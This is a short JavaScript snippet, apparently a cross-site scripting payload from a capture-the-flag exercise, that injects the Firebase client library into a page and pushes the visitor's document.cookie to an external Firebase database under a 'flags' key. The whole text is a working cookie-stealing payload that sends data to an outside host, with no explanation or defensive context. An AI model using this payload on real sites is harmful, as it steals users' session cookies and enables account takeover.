var script = document.createElement('script');
script.type = 'text/javascript';
script.src = 'https://cdn.firebase.com/js/client/2.4.0/firebase.js';
document.head.appendChild(script);

var myFirebaseRef = new Firebase("https://przno-test.firebaseio.com/");
var flags = myFirebaseRef.child("flags");

flags.push().set({flag: document.cookie})
